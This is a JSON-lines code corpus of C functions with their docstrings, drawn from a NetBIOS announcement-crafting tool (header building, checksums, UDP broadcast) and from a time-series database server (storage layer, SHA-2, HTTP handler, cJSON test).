{"docstring": "/* Build the NBT DS header */\n", "func_signal": "void build_nbt_header (nbt_header *hdr, unsigned char *sourceip, char *sourcename, char *destinationname, int type)", "code": "{\n\tunsigned long ip;\n\tchar source[34];\n\tchar dest[34];\n\n\t/* Params computation */\n\tip = resolve(sourceip);\n\tif (type == 2) {\n\t\t/* Domain/Workgroup announcement */\n\t\tname_mangle(sourcename,source,0x00);\n\t\tname_mangle(\"\\x01\\x02__MSBROWSE__\\x02\",dest,0x01);\n\t}\n\telse {\n\t\t/* Default: Host/Master announcement */\n\t\tname_mangle (sourcename,source,0x00);\t\t// 0x00 (Workstation svc) or 0x20 (Server svc)\n\t\tname_mangle (destinationname,dest,0x1e);\t// 0x1d: Local Master Browser, 0x1e: Browser Service Elections\n\t}\n\n\tmemset(hdr, 0, sizeof(nbt_header));\n\n\t/* NBT Header */\n\thdr->type = 17;\n\thdr->flags = 2; // or 10 (node type)\n\thdr->id = htons((unsigned short)rand());\n\thdr->sourceip = ip;\n\thdr->sourceport = htons(138);\n\thdr->length = htons(211);\t\t// to compute if modified (but not really used)\n\thdr->offset = 0;\n\tstrcpy (hdr->sourcename, source);\n\tstrcpy (hdr->destinationname, dest);\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Display a hex dump */\n", "func_signal": "void hexdump(unsigned char *p, unsigned int len)", "code": "{\n\tunsigned char *line = p;\n\tunsigned int thisline, offset = 0;\n\tunsigned int i;\n\n\twhile (offset < len)\n\t{\n\t\tprintf(\"%04x \", offset);\n\t\tthisline = len - offset;\n\t\tif (thisline > 16)\n\t\t\tthisline = 16;\n\n\t\tfor (i = 0; i < thisline; i++)\n\t\t\tprintf(\"%02x \", line[i]);\n\n\t\tfor (; i < 16; i++)\n\t\t\t\tprintf(\"   \");\n\n\t\tfor (i = 0; i < thisline; i++)\n\t\t\tprintf(\"%c\",\n\t\t\t       (line[i] >= 0x20\n\t\t\t\t&& line[i] < 0x7f) ? line[i] : '.');\n\n\t\tprintf(\"\\n\");\n\t\toffset += thisline;\n\t\tline += thisline;\n\t}\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Calculates the 16-bit one's complement sum for the supplied buffer */\n", "func_signal": "unsigned short checksum(unsigned short *buffer, int size)", "code": "{\n\tunsigned long cksum=0;\n\n\twhile (size > 1) {\n\tcksum += *buffer++;\n\tsize -= sizeof(unsigned short);\n\t}\n\tif (size) {\n\tcksum += *(unsigned char *)buffer;\n\t}\n\tcksum = (cksum >> 16) + (cksum & 0xffff);\n\tcksum += (cksum >>16);\n\n\treturn (unsigned short)(~cksum);\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Return the total storage length of a mangled name */\n", "func_signal": "int name_len (char *s1)", "code": "{\n\t/* NOTE: this argument _must_ be unsigned */\n\tunsigned char *s = (unsigned char *) s1;\n\tint len;\n\n\t/* If the two high bits of the byte are set, return 2. */\n\tif (0xC0 == (*s & 0xC0))\n\treturn (2);\n\n\t/* Add up the length bytes. */\n\tfor (len = 1; (*s); s += (*s) + 1)\n\t{\n\t  len += *s + 1;\n\t  assert (len < 80);\n\t}\n\n\treturn (len);\n}", "path": "Sources\\FakeNetbiosNS.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* \"Classic\" UDP connection: in case raw IP is not supported on the system */\n", "func_signal": "int send_udp(unsigned long sourceIP, unsigned short sourceport, unsigned long destIP, unsigned short destport, char *udpmsg, int udpmsgLen)", "code": "{\n\tunsigned int s;\t// socket\n    struct sockaddr_in local, remote;\n    int i;\n\tint bf;\n    fd_set wd;\n    struct timeval tv;\n#ifdef WIN32\n\tBOOL bOpt;\n#else\n\tint bOpt;\n#endif\n\tint ret;\n\n\t/* Create a socket */\n    s = socket(AF_INET, SOCK_DGRAM, 0);\n#ifdef WIN32\n\tif (s == INVALID_SOCKET) {\n\t\tprintf(\"A socket couldn't be created: error [%d]\\n\", WSAGetLastError());\n\t\treturn -1;\n\t}\n#else\n    if (s < 0) {\n\t\tprintf(\"A socket couldn't be created: error [%d]\\n\", s);\n        return -1;\n    }\n#endif\n\n\t/* Enable the Broadcast option */\n#ifdef WIN32\n\tbOpt = TRUE;\n#else\n\tbOpt = 1;\n#endif\n\tret = setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&bOpt, sizeof(bOpt));\n\n#ifdef WIN32\n\tif (ret == SOCKET_ERROR) {\n\t\tprintf(\"setsockopt(SO_BROADCAST) failed: error [%d]\\n\", WSAGetLastError());\n\t\treturn -1;\n\t}\n#endif\n\n    memset((char *)&local, 0, sizeof(local));\n\n\t/* Bind source port */\n    local.sin_family = AF_INET;\n    local.sin_addr.s_addr = htonl(sourceIP); // or htonl(INADDR_ANY)\n    local.sin_port = htons(sourceport);\n\n    remote.sin_family = AF_INET;\n    remote.sin_addr.s_addr = destIP;\n    if(remote.sin_addr.s_addr == 0) {\n#ifdef WIN32\n\t\tclosesocket(s);\n#else\n\t\tclose(s);\n#endif\n        return -2;\n    }\n    remote.sin_port = htons(destport);\n\n    bf = 1;\n#ifdef WIN32\n    ioctlsocket(s, FIONBIO, (u_long *)&bf);\n#endif\n\n    tv.tv_sec = 10;\n    tv.tv_usec = 0;\n    FD_ZERO(&wd);\n    FD_SET(s, &wd);\n\n    connect(s, (struct sockaddr *)&remote, sizeof(remote));\n\tif ((i = select(s+1, 0, &wd, 0, &tv)) == (-1)) {\n#ifdef WIN32\n\t\tclosesocket(s);\n#else\n\t\tclose(s);\n#endif\n\t\treturn -3;\n    }\n\n\tif (i == 0) {\n#ifdef WIN32\n\t\tclosesocket(s);\n#else\n\t\tclose(s);\n#endif\n\t\treturn -4;\n    }\n\n    i = sizeof(int);\n    getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&bf, &i);\n    if ((bf != 0) || (i != sizeof(int))) {\n#ifdef WIN32\n\t\tclosesocket(s);\n#else\n\t\tclose(s);\n#endif\n\t\terrno = bf;\n\t\treturn -5;\n    }\n#ifdef WIN32\n    ioctlsocket(s, FIONBIO, (u_long *)&bf);\n#endif\n\n\t/* Send data */\n#ifdef WIN32\n\tret = sendto(s, udpmsg, udpmsgLen, 0, (SOCKADDR *)&remote, sizeof(remote));\n\tif (ret == SOCKET_ERROR) {\n\t\tprintf(\"sendto() failed: %d\\n\", WSAGetLastError());\n\t\treturn -6;\n\t} else\n#else\n\tret = sendto(s, udpmsg, udpmsgLen, 0, (struct sockaddr *)&remote, sizeof(remote));\n#endif\n\n\t/* Close socket */\n#ifdef WIN32\n\tclosesocket(s);\n#else\n\tclose(s);\n#endif\n\n\treturn 0;\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/* Calculates the 16-bit one's complement sum for the supplied buffer */\n", "func_signal": "unsigned short checksum(unsigned short *buffer, int size)", "code": "{\n\tunsigned long cksum=0;\n\n\twhile (size > 1) {\n\tcksum += *buffer++;\n\tsize -= sizeof(unsigned short);\n\t}\n\tif (size) {\n\tcksum += *(unsigned char *)buffer;\n\t}\n\tcksum = (cksum >> 16) + (cksum & 0xffff);\n\tcksum += (cksum >>16);\n\n\treturn (unsigned short)(~cksum);\n}", "path": "Sources\\FakeNetbiosDGM.c", "repo_name": "mubix/FakeNetBIOS", "stars": 41, "license": "other", "language": "c", "size": 178}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int sha2_self_test( int verbose )", "code": "{\n    int i, j, k, buflen;\n    unsigned char buf[1024];\n    unsigned char sha2sum[32];\n    sha2_context ctx;\n\n    for( i = 0; i < 6; i++ )\n    {\n        j = i % 3;\n        k = i < 3;\n\n        if( verbose != 0 )\n            printf( \"  SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        sha2_starts( &ctx, k );\n\n        if( j == 2 )\n        {\n            memset( buf, 'a', buflen = 1000 );\n\n            for( j = 0; j < 1000; j++ )\n                sha2_update( &ctx, buf, buflen );\n        }\n        else\n            sha2_update( &ctx, sha2_test_buf[j],\n                               sha2_test_buflen[j] );\n\n        sha2_finish( &ctx, sha2sum );\n\n        if( memcmp( sha2sum, sha2_test_sum[i], 32 - k * 4 ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    for( i = 0; i < 14; i++ )\n    {\n        j = i % 7;\n        k = i < 7;\n\n        if( verbose != 0 )\n            printf( \"  HMAC-SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        if( j == 5 || j == 6 )\n        {\n            memset( buf, '\\xAA', buflen = 131 );\n            sha2_hmac_starts( &ctx, buf, buflen, k );\n        }\n        else\n            sha2_hmac_starts( &ctx, sha2_hmac_test_key[j],\n                                    sha2_hmac_test_keylen[j], k );\n\n        sha2_hmac_update( &ctx, sha2_hmac_test_buf[j],\n                                sha2_hmac_test_buflen[j] );\n\n        sha2_hmac_finish( &ctx, sha2sum );\n\n        buflen = ( j == 4 ) ? 16 : 32 - k * 4;\n\n        if( memcmp( sha2sum, sha2_hmac_test_sum[i], buflen ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    return( 0 );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/* FIXME: Timestamp is passed in to allow for integrity checking the lower layers. Not yet implemented */\n", "func_signal": "static int tsdb_update_layer(tsdb_ctx_t *ctx, unsigned int layer, uint_fast32_t point, uint_fast32_t npoints,\n\tint64_t timestamp, tsdb_data_t *values)", "code": "{\n\tunsigned int metric;\n\ttsdb_data_t new_values[TSDB_MAX_METRICS];\n\ttsdb_data_t *ptr;\n\t\n\tFUNCTION_TRACE;\n\t\n\tDEBUG(\"Values for %u metrics at %\" PRIi64 \" at point %\" PRIuFAST32 \" in layer %d\\n\", ctx->meta->nmetrics,\n\t      timestamp, point, layer);\n\t\n\t/* Pad missing values */\n\tif (point > npoints) {\n\t\tuint_fast32_t npadding = point - npoints;\n\t\tunsigned int pointsperblock = TSDB_MAX_PADDING_BLOCK / (sizeof(tsdb_data_t) * ctx->meta->nmetrics);\n\t\tunsigned int n;\n\n\t\tDEBUG(\"Padding %\" PRIuFAST32 \" points\\n\", npadding);\n\t\t\n\t\t/* Fill padding block buffer */\n\t\tif (npadding < pointsperblock)\n\t\t\tpointsperblock = npadding;\n\t\tptr = ctx->padding;\n\t\tfor (n = 0; n < pointsperblock; n++) {\n\t\t\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++, ptr++) {\n\t\t\t\tswitch ((tsdb_pad_mode_t)((ctx->meta->flags[metric] >> TSDB_PAD_SHIFT) & TSDB_PAD_MASK)) {\n\t\t\t\t\tcase tsdbPad_Unknown:\n\t\t\t\t\t\t*ptr = NAN;\n\t\t\t\t\t\tbreak;\n \t\t\t\t\tcase tsdbPad_Last:\n\t\t\t\t\t\tDEBUG(\"FIXME: tsdbPad_Last not implemented\\n\"); \n\t\t\t\t\t\t*ptr = NAN; // FIXME:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tERROR(\"Bad padding mode\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\t/* Write blocks to table file */\n\t\tif (lseek(ctx->table_fd[layer], sizeof(tsdb_data_t) * npoints * ctx->meta->nmetrics, SEEK_SET) < 0) {\n\t\t\tERROR(\"Padding seek error\\n\");\n\t\t\treturn -errno;\n\t\t}\n\t\tdo {\n\t\t\tif (npadding < pointsperblock)\n\t\t\t\tpointsperblock = npadding;\n\t\t\tDEBUG(\"%u points of %\" PRIuFAST32 \"\\n\", pointsperblock, npadding);\n\t\t\tif (write(ctx->table_fd[layer], ctx->padding, \n\t\t\t\tsizeof(tsdb_data_t) * pointsperblock * ctx->meta->nmetrics) < 0) {\n\t\t\t\tERROR(\"Padding write error\\n\");\n\t\t\t\treturn -errno;\n\t\t\t}\n\t\t\tnpadding -= pointsperblock;\n\t\t} while (npadding);\n\t\t\n\t}\n\t\n\t/* Default unknown points to NAN */\n\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++) {\n\t\tnew_values[metric] = NAN;\n\t}\n\t\n\tif (point < ctx->meta->npoints) {\n\t\t/* Updating existing point - read current values */\n\t\tif (lseek(ctx->table_fd[layer], sizeof(tsdb_data_t) * point * ctx->meta->nmetrics, SEEK_SET) < 0) {\n\t\t\tERROR(\"Table seek error reading values for point %\" PRIuFAST32 \"\\n\", point);\n\t\t\treturn -errno;\n\t\t}\n\t\tif (read(ctx->table_fd[layer], new_values, sizeof(tsdb_data_t) * ctx->meta->nmetrics) < 0) {\n\t\t\tERROR(\"Table read error reading values for point %\" PRIuFAST32 \"\\n\", point);\n\t\t\treturn -errno;\n\t\t}\n\t}\n\t\n\t/* Fill in any non-NAN new values */\n\tptr = values;\n\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++, ptr++) {\n\t\tif (!isnan(*ptr)) {\n\t\t\tnew_values[metric] = *ptr;\n\t\t}\n\t}\n\t\n\t/* Write point back to file */\n\tif (lseek(ctx->table_fd[layer], sizeof(tsdb_data_t) * point * ctx->meta->nmetrics, SEEK_SET) < 0) {\n\t\tERROR(\"Table seek error writing values for point %\" PRIuFAST32 \"\\n\", point);\n\t\treturn -errno;\n\t}\n\tif (write(ctx->table_fd[layer], new_values, sizeof(tsdb_data_t) * ctx->meta->nmetrics) < 0) {\n\t\tERROR(\"Table write error writing values for point %\" PRIuFAST32 \"\\n\", point);\n\t\treturn -errno;\n\t}\n\t\n\t/* Decimate */\n\tif (ctx->meta->decimation[layer] > 0) {\n\t\tuint_fast32_t first_point;\n\t\ttsdb_data_t next_values[TSDB_MAX_METRICS];\n\t\tint count;\n\t\tunsigned int valid_count[TSDB_MAX_METRICS];\n\t\t\n\t\t/* Read contributing points to decimation buffer */\n\t\tfirst_point = (point / ctx->meta->decimation[layer]) * ctx->meta->decimation[layer];\n\t\tDEBUG(\"Decimate %\" PRIu32 \" points starting at %\" PRIuFAST32 \"\\n\",\n\t\t      ctx->meta->decimation[layer], first_point);\n\t\tif (lseek(ctx->table_fd[layer], sizeof(tsdb_data_t) * first_point * ctx->meta->nmetrics, SEEK_SET) < 0) {\n\t\t\tERROR(\"Table seek error while decimating\\n\");\n\t\t\treturn -errno;\n\t\t}\n\t\tcount = read(ctx->table_fd[layer], ctx->work_buffer, sizeof(tsdb_data_t) * ctx->meta->decimation[layer] * ctx->meta->nmetrics);\n\t\tif (count < 0) {\n\t\t\tERROR(\"Table read error while decimating\\n\");\n\t\t\treturn -errno;\n\t\t}\n\t\t\n\t\t/* Calculate decimated values */\n\t\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++) {\n\t\t\tvalid_count[metric] = 0;\n\t\t\tswitch ((tsdb_downsample_mode_t)((ctx->meta->flags[metric] >> TSDB_DOWNSAMPLE_SHIFT) & TSDB_DOWNSAMPLE_MASK)) {\n\t\t\t\tcase tsdbDownsample_Min:\n\t\t\t\t\tnext_values[metric] = INFINITY;\n\t\t\t\t\tbreak;\n\t\t\t\tcase tsdbDownsample_Max:\n\t\t\t\t\tnext_values[metric] = -INFINITY;\n\t\t\t\tdefault:\n\t\t\t\t\tnext_values[metric] = 0.0;\n\t\t\t}\n\t\t}\n\t\tcount = count / sizeof(tsdb_data_t) / ctx->meta->nmetrics;\n\t\tptr = ctx->work_buffer;\n\t\twhile (count--) {\n\t\t\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++, ptr++) {\n\t\t\t\tif (isnan(*ptr)) {\n\t\t\t\t\t/* Skip unknown values */\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t/* Perform decimation according to the option selected in the\n\t\t\t\t* flags for this metric */\n\t\t\t\tswitch ((tsdb_downsample_mode_t)((ctx->meta->flags[metric] >> TSDB_DOWNSAMPLE_SHIFT) & TSDB_DOWNSAMPLE_MASK)) {\n\t\t\t\t\tcase tsdbDownsample_Mean:\n\t\t\t\t\tcase tsdbDownsample_Sum:\n\t\t\t\t\t\tnext_values[metric] += *ptr;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase tsdbDownsample_Median:\n\t\t\t\t\t\tERROR(\"FIXME: MEDIAN not implemented\\n\"); // FIXME:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase tsdbDownsample_Mode:\n\t\t\t\t\t\tERROR(\"FIXME: MODE not implemented\\n\"); // FIXME:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase tsdbDownsample_Min:\n\t\t\t\t\t\tif (*ptr < next_values[metric])\n\t\t\t\t\t\t\tnext_values[metric] = *ptr;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase tsdbDownsample_Max:\n\t\t\t\t\t\tif (*ptr > next_values[metric])\n\t\t\t\t\t\t\tnext_values[metric] = *ptr;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tERROR(\"Bad downsampling mode\\n\");\n\t\t\t\t}\n\t\t\t\tvalid_count[metric]++;\n\t\t\t}\n\t\t}\n\t\t\n\t\tfor (metric = 0; metric < (unsigned int)ctx->meta->nmetrics; metric++) {\n\t\t\tif (valid_count[metric]) {\n\t\t\t\t/* Complete the decimation function */\n\t\t\t\tswitch ((tsdb_downsample_mode_t)((ctx->meta->flags[metric] >> TSDB_DOWNSAMPLE_SHIFT) & TSDB_DOWNSAMPLE_MASK)) {\n\t\t\t\t\tcase tsdbDownsample_Mean:\n\t\t\t\t\t\tnext_values[metric] /= (double)valid_count[metric];\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase tsdbDownsample_Median:\n\t\t\t\t\tcase tsdbDownsample_Mode:\n\t\t\t\t\tcase tsdbDownsample_Sum:\n\t\t\t\t\tcase tsdbDownsample_Min:\n\t\t\t\t\tcase tsdbDownsample_Max:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tERROR(\"Bad downsampling mode\\n\");\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t/* Next value is unknown */\n\t\t\t\tnext_values[metric] = NAN;\n\t\t\t}\n\t\t\tDEBUG(\"Metric %u found %u usable points (agg = %f)\\n\", metric, valid_count[metric],\n\t\t\t\tnext_values[metric]);\n\t\t}\n\t\t\n\t\t/* Recurse down */\n\t\ttsdb_update_layer(ctx, layer + 1, \n\t\t\tpoint / ctx->meta->decimation[layer],\n\t\t\t/* npoints needs to be rounded up */\n\t\t\t(npoints + ctx->meta->decimation[layer] - 1) / ctx->meta->decimation[layer], \n\t\t\ttimestamp, next_values);\n\t}\n\t\n\treturn 0;\n}", "path": "src\\tsdb.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * output = SHA-256( file contents )\n */\n", "func_signal": "int sha2_file( const char *path, unsigned char output[32], int is224 )", "code": "{\n    FILE *f;\n    size_t n;\n    sha2_context ctx;\n    unsigned char buf[1024];\n\n    if( ( f = fopen( path, \"rb\" ) ) == NULL )\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n\n    sha2_starts( &ctx, is224 );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha2_update( &ctx, buf, n );\n\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n\n    if( ferror( f ) != 0 )\n    {\n        fclose( f );\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n    }\n\n    fclose( f );\n    return( 0 );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*!\n * \\brief Microhttpd access handler\n */\n", "func_signal": "static int http_handler(void *arg,\n\tstruct MHD_Connection *conn,\n\tconst char *url,\n\tconst char *method,\n\tconst char *version,\n\tconst char *upload_data,\n\tsize_t *upload_data_size,\n\tvoid **ptr)", "code": "{\n\tstruct MHD_Response *response;\n\thttp_ctx_t *ctx;\n\thttp_entity_t *ent;\n\thttp_handler_t handler;\n\tint rc;\n\t/* Handler variables */\n\tchar *content_type = NULL, *location = NULL;\n\tchar *resp_data = NULL;\n\tsize_t resp_data_size = 0;\n\tunsigned int status = MHD_HTTP_OK;\n\t\n\tFUNCTION_TRACE;\n\t\n\t/* Allocate context if required */\n\tif (*ptr == NULL) {\n\t\t*ptr = calloc(1, sizeof(http_ctx_t));\n\t\tif (*ptr == NULL) {\n\t\t\tCRITICAL(\"Out of memory\\n\");\n\t\t\treturn MHD_NO;\n\t\t}\n\t\treturn MHD_YES;\n\t}\n\tctx = (http_ctx_t*)*ptr;\n\t\n\t/* Get POST data if present */\n\tif (*upload_data_size != 0) {\n\t\tchar *new_buffer;\n\n\t\t/* Join chunks from multiple calls */\n\t\tDEBUG(\"Growing upload buffer from %d to %d\\n\", (int)ctx->upload_data_size, (int)ctx->upload_data_size + (int)*upload_data_size);\n\t\tnew_buffer = (char*)realloc(ctx->upload_data, ctx->upload_data_size + *upload_data_size);\n\t\tif (new_buffer == NULL) {\n\t\t\tCRITICAL(\"Out of memory\\n\");\n\t\t\tstatus = MHD_HTTP_INTERNAL_SERVER_ERROR;\n\t\t\tgoto response;\n\t\t}\n\t\tctx->upload_data = new_buffer;\n\t\tmemcpy(ctx->upload_data + ctx->upload_data_size, upload_data, *upload_data_size);\n\t\tctx->upload_data_size += *upload_data_size;\n\t\t*upload_data_size = 0 ;\n\t\treturn MHD_YES;\n\t}\n\n\t/* FIXME: Check Accept header (for GET) - return 406 Not Acceptable,\n\t * Check Content-type header (for POST) - return 415 Unsupported Media Type */\n\n\t/* Split URL on slashes and walk the entity tree for a suitable handler */\n\tDEBUG(\"%s %s\\n\", method, url);\n//\tDEBUG(\"Request data:\\n%.*s\\n\", (int)ctx->upload_data_size, ctx->upload_data);\n\tent = http_find_entity(url);\n\tif (ent == NULL) {\n\t\t/* No such entity */\n\t\tstatus = MHD_HTTP_NOT_FOUND;\n\t\tgoto response;\n\t}\n\t\n\t/* Parse method and call appropriate handler if available */\n\tif (strcmp(method, \"GET\") == 0 && ent->get_handler) {\n\t\thandler = ent->get_handler;\n\t} else if (strcmp(method, \"PUT\") == 0 && ent->put_handler) {\n\t\thandler = ent->put_handler;\n\t} else if (strcmp(method, \"POST\") == 0 && ent->post_handler) {\n\t\thandler = ent->post_handler;\n\t} else if (strcmp(method, \"DELETE\") == 0 && ent->delete_handler) {\n\t\thandler = ent->delete_handler;\n\t} else {\n\t\t/* Unsupported method */\n\t\tERROR(\"Unsupported method %s for %s\\n\", method, url);\n\t\tstatus = MHD_HTTP_METHOD_NOT_ALLOWED;\n\t\thandler = NULL;\n\t}\n\tif (handler) {\n\t\tstatus = (handler)(\n\t\t\tconn, url, &content_type, &location,\n\t\t\tctx->upload_data, ctx->upload_data_size,\n\t\t\t&resp_data, &resp_data_size,\n\t\t\tent->arg);\n\t}\n\nresponse:\n\t/* Free request context */\n\tif (ctx->upload_data)\n\t\tfree(ctx->upload_data);\n\tfree(ctx);\n\t*ptr = NULL;\n\t\n\t/* Build response */\n\tDEBUG(\"status = %u\\n\", status);\n\tresponse = MHD_create_response_from_buffer(resp_data_size, resp_data,\n\t\tresp_data ? MHD_RESPMEM_MUST_FREE : MHD_RESPMEM_PERSISTENT);\n\t\n\tif (location) {\n\t\tconst char *host = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, \"Host\");\n\t\tchar redirect_url[MAX_REDIRECT_URL_SIZE];\n\n\t\t/* Only add Location: header if the handler returned something */\n\t\tDEBUG(\"Handler supplied location: %s\\n\", location);\n\n\t\t/* Host: header is mandatory for HTTP/1.1, but if for some reason it was missing\n\t\t * fall back to the default host name */\n\t\tif (host == NULL)\n\t\t\thost = DEFAULT_HOST;\n\n\t\t/* Assemble the full URL */\n\t\tsnprintf(redirect_url, MAX_REDIRECT_URL_SIZE,\n\t\t\tDEFAULT_URL_SCHEME \"%s%s\", host, location);\n\t\tfree(location); /* Handlers expect us to clean this up */\n\n\t\tDEBUG(\"Full URL for redirect: %s\\n\", redirect_url);\n\t\tMHD_add_response_header(response, MHD_HTTP_HEADER_LOCATION, redirect_url);\n\t}\n\n\t/* If a bad method was requested than add the Allow header based on the handlers\n\t * defined for the entity */\n\tif (status == MHD_HTTP_METHOD_NOT_ALLOWED) {\n\t\tchar allow[32] = {0};\n\t\tchar *allowptr = allow;\n\t\t\n\t\tif (ent->get_handler)\n\t\t\tallowptr += sprintf(allowptr, \"GET, \");\n\t\tif (ent->put_handler)\n\t\t\tallowptr += sprintf(allowptr, \"PUT, \");\n\t\tif (ent->post_handler)\n\t\t\tallowptr += sprintf(allowptr, \"POST, \");\n\t\tif (ent->delete_handler)\n\t\t\tallowptr += sprintf(allowptr, \"DELETE, \");\n\t\tif (allow[0] == '\\0') {\n\t\t\t/* This entity doesn't support anything! */\n\t\t\tCRITICAL(\"Entity %s has no methods!\\n\", ent->name);\n\t\t\tstatus = MHD_HTTP_NOT_FOUND;\n\t\t} else {\n\t\t\t/* Remove last \", \" */\n\t\t\tallowptr[-2] = '\\0';\n\t\t\t\n\t\t\tDEBUG(\"Supported methods: %s\\n\", allow);\n\t\t\tMHD_add_response_header(response, MHD_HTTP_HEADER_ALLOW, allow);\n\t\t}\n\t}\n\t\n\tif (resp_data) {\n\t\tif (content_type) {\n\t\t\t/* Handler supplied a custom content type */\n\t\t\tDEBUG(\"Handler supplied content-type: %s\\n\", content_type);\n\t\t\tMHD_add_response_header(response, MHD_HTTP_HEADER_CONTENT_TYPE, content_type);\n\t\t\tfree(content_type); /* Handlers expect us to clean this up */\n\t\t} else {\n\t\t\t/* Fall back to default */\n\t\t\tMHD_add_response_header(response, MHD_HTTP_HEADER_CONTENT_TYPE, DEFAULT_CONTENT_TYPE);\n\t\t}\n\t}\n\t\n\t/* Add generic headers */\n\tMHD_add_response_header(response, \"Access-Control-Allow-Origin\", \"*\");\t\n\t{\n\t\tchar keepalive[32];\n\t\tsnprintf(keepalive, 32, \"timeout=%d; max=%d\", CONNECTION_TIMEOUT, CONNECTION_LIMIT);\n\t\tMHD_add_response_header(response, \"Keep-Alive\", keepalive);\n\t}\n\tMHD_add_response_header(response, MHD_HTTP_HEADER_CONNECTION, \"keep-alive\");\n\tMHD_add_response_header(response, MHD_HTTP_HEADER_SERVER, SERVER_NAME);\n\t\n\t/* Send the response */\n\trc = MHD_queue_response(conn, status, response);\n\tMHD_destroy_response(response);\n\treturn rc;\n}", "path": "src\\http.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*!\n * \\brief Find an entity for the given URL\n * \\param url_in\tTarget URL\n * \\return\t\tPointer to entity descriptor or NULL if not found\n */\n", "func_signal": "static http_entity_t *http_find_entity(const char *url_in)", "code": "{\n\thttp_entity_t *ent = http_root_entity;\n\tchar *url = strdup(url_in);\n\tchar *needle, *haystack;\n\tchar *saveptr;\n\t\n\tFUNCTION_TRACE;\n\t\n\thaystack = url;\n\twhile (ent && (needle = strtok_r(haystack, \"/\", &saveptr))) {\n\t\thaystack = NULL;\n\t\tent = ent->child;\n\t\t\n\t\t/* Recurse through all entities at this level */\n\t\twhile (ent) {\n\t\t\t/* Match on equality or wildcard */\n\t\t\tif (strcmp(ent->name, \"*\") == 0 || strcasecmp(ent->name, needle) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tent = ent->next;\n\t\t}\n\t}\n\tfree(url); /* free strdup */\n\treturn ent;\n}", "path": "src\\http.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * output = SHA-256( input buffer )\n */\n", "func_signal": "void sha2( const unsigned char *input, size_t ilen,\n           unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_starts( &ctx, is224 );\n    sha2_update( &ctx, input, ilen );\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/* Parse text to JSON, then render back to text, and print! */\n", "func_signal": "void doit(char *text)", "code": "{\n\tchar *out;cJSON *json;\n\t\n\tjson=cJSON_Parse(text);\n\tif (!json) {printf(\"Error before: [%s]\\n\",cJSON_GetErrorPtr());}\n\telse\n\t{\n\t\tout=cJSON_Print(json);\n\t\tcJSON_Delete(json);\n\t\tprintf(\"%s\\n\",out);\n\t\tfree(out);\n\t}\n}", "path": "src\\cJSON\\test.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
